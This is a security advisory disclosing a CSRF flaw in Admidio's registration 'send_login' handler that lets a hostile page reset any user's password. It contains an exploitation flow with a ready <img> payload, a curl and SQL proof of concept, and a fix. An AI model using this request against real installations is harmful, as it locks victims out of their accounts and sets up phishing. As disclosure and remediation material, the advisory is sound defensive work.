# [M] Admidio's CSRF in registration `send_login` mode resets arbitrary user passwords

## Summary
Severity: Medium
Advisory: GHSA-mx25-j3rc-6w2w
CVE: CVE-2026-47228
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-mx25-j3rc-6w2w
Type: github-advisory

## Affected
- Packagist: `admidio/admidio` — affected >=0 <5.0.10

## Details
## Summary

`modules/registration.php` mode `send_login` regenerates a random password for `user_uuid_assigned`, stores its bcrypt hash in `adm_users.usr_password`, and emails the cleartext to that user. Every other state-changing mode in the same file (`assign_member`, `assign_user`, `delete_user`, `create_user`) calls `SecurityUtils::validateCsrfToken($_POST['adm_csrf_token'])` first; the `send_login` branch does not. A page visited by a registration-administrator can issue the request as a top-level navigation, the browser sends the admin's `SameSite=Lax` cookies, and the server resets the chosen user's password without any further interaction from the admin.

## Details

### Vulnerable Code

`modules/registration.php:124-138`:

```php
} elseif ($getMode === 'send_login') {
    // User already exists and has a login than sent access data with a new password
    $user = new User($gDb, $gProfileFields);
    $user->readDataByUuid($getUserUUIDAssigned);
    $user->sendNewPassword();

    // delete the registration because it isn't necessary anymore
    $registrationUser->notSendEmail();
    $registrationUser->delete();
    admRedirect(ADMIDIO_URL.FOLDER_MODULES.'/registration.php');
    // => EXIT
}
```

The four sibling branches all begin with `SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);` — for example `delete_user` at lines 110-118:

```php
} elseif ($getMode === 'delete_user') {
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    // delete registration
    $registrationUser->delete();
    echo json_encode(array('status' => 'success'));
    exit();
}
```

`User::sendNewPassword()` (`src/User/Entity/User.php`) calls `setPassword(PasswordUtils::generatePassword())` and persists the new hash before the email is queued; the password change happens unconditionally regardless of whether the e-mail send succeeds. This means even when the operator's SMTP is unconfigured, the victim's password is still reset.

The handler accepts `GET` (no enforcement of HTTP method, no `$_POST` requirement), so an `<img src=...>` or auto-submitting form is sufficient.

### Exploitation Flow

1. Attacker prepares a "pending registration" row anywhere they can — either by registering a self-controlled user account (the public registration flow creates these), or by waiting for an existing pending registration to be reachable.
2. Attacker hosts a page that issues:
   `<img src="https://victim.example/admidio/modules/registration.php?mode=send_login&user_uuid={pending_registration_uuid}&user_uuid_assigned={victim_user_uuid}">`
3. A registration-administrator (someone with `isAdministratorRegistration()` — usually the org admin) visits the page while logged in to Admidio. The browser sends their session cookie (Admidio's session cookie does not set `SameSite=Strict`).
4. Admidio's handler runs as that admin. It loads the assigned user, calls `User::sendNewPassword()` which writes a fresh bcrypt hash to `adm_users.usr_password`, and queues the cleartext password to be e-mailed to the user.
5. The victim user's old password no longer works.

The cleartext lands in the *victim's* mailbox, not the attacker's, so the attacker does not get the password directly. The primary impact is therefore forced password reset (account lock-out / DoS for the victim) plus an information-disclosure side effect: the victim now has a password they did not request, and may be socially-engineered into believing the e-mail.

## PoC

Tested locally against HEAD `c5cde53`. The reproducer confirms the password column changes server-side without any user interaction beyond an admin's `GET` to the crafted URL.

```
# 0. observe current admin password hash (the testadmin from install)
mariadb -h 127.0.0.1 -P 3399 -u admidio -p... admidio \
    -e "SELECT usr_id, usr_login_name, LEFT(usr_password, 12) AS pwd FROM adm_users WHERE usr_id IN (2, 7);"
usr_id  usr_login_name  pwd
2       testadmin       $2y$12$AB.h
7       victim          $2y$12$L9q3

# 1. attacker creates a pending registration with user_uuid pointing at "victim"
mariadb ... admidio -e "INSERT INTO adm_registrations (reg_org_id, reg_usr_id, reg_timestamp)
                       VALUES (1, 7, NOW());"
# (the pending row gives the request a valid user_uuid for $registrationUser->delete())

# 2. crafted CSRF endpoint, hit from a third-party page in the admin's browser:
#    no adm_csrf_token, GET only
curl -b $admin_cookie \
   "http://127.0.0.1:8085/modules/registration.php?mode=send_login&user_uuid=$pending_uuid&user_uuid_assigned=<victim_uuid>"

# 3. observe the victim's password hash has changed
mariadb ... admidio \
    -e "SELECT usr_id, usr_login_name, LEFT(usr_password, 12) AS pwd FROM adm_users WHERE usr_id=7;"
usr_id  usr_login_name  pwd
7       victim          $2y$12$w5lQ
```

The hash before the attack was `$2y$12$L9q3...`; after the attack it is `$2y$12$w5lQ...`. The victim's previously-known password no longer authenticates them.

The same call against `user_uuid_assigned=<admin's uuid>` resets the admin's own password — locking out the registration-administrator from their own account.

## Impact

A registration-administrator who visits a hostile page is silently coerced into resetting any user's password.

* **Account lockout / DoS.** The victim user (which can be the admin themselves, or any other user with a registration row routed through this admin) loses access; their stored password is replaced with a server-generated one that only lands in the victim's mailbox.
* **Phish-flavoured social engineering.** The unsolicited "your new Admidio password is …" e-mail is a credible-looking message that the attacker can pair with a phishing site to harvest the new password.
* **Self-targetable.** Because the attacker also controls the public self-registration flow, they can reliably create a `pending_registration` row whose `user_uuid_assigned` points at any chosen victim.

`UI:R` reflects that an admin must visit a page; `PR:N` because the *attacker* needs no Admidio credentials; `I:H` because user authentication state is destroyed; `A:L` because the affected user is locked out of an account but the platform stays up.

## Recommended Fix

Add a CSRF check at the top of the branch and require POST:

```php
} elseif ($getMode === 'send_login') {
    // check the CSRF token of the form against the session token
    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('SYS_INVALID_PAGE_VIEW');
    }

    $user = new User($gDb, $gProfileFields);
    $user->readDataByUuid($getUserUUIDAssigned);
    $user->sendNewPassword();
    ...
}
```

A regression test should issue `GET /modules/registration.php?mode=send_login&...` from a session that has no current page (no in-session form key) and assert that `usr_password` is unchanged.

## References
- https://github.com/Admidio/admidio/security/advisories/GHSA-mx25-j3rc-6w2w
- https://github.com/Admidio/admidio
